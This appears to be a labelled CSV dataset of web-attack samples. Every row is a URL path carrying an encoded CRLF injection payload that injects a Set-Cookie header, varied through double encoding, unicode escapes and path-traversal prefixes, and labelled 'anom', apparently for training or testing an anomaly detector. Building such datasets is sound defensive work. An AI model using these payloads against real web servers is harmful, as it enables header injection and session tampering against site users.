payload,label
/%%0a0aSet-Cookie:crlf=injection,anom
/%0aSet-Cookie:crlf=injection,anom
/%0d%0aSet-Cookie:crlf=injection,anom
/%0dSet-Cookie:crlf=injection,anom
/%23%0aSet-Cookie:crlf=injection,anom
/%23%0d%0aSet-Cookie:crlf=injection,anom
/%23%0dSet-Cookie:crlf=injection,anom
/%25%30%61Set-Cookie:crlf=injection,anom
/%25%30aSet-Cookie:crlf=injection,anom
/%250aSet-Cookie:crlf=injection,anom
/%25250aSet-Cookie:crlf=injection,anom
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection,anom
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection,anom
/%2F..%0d%0aSet-Cookie:crlf=injection,anom
/%3f%0d%0aSet-Cookie:crlf=injection,anom
/%3f%0dSet-Cookie:crlf=injection,anom
/%u000aSet-Cookie:crlf=injection,anom
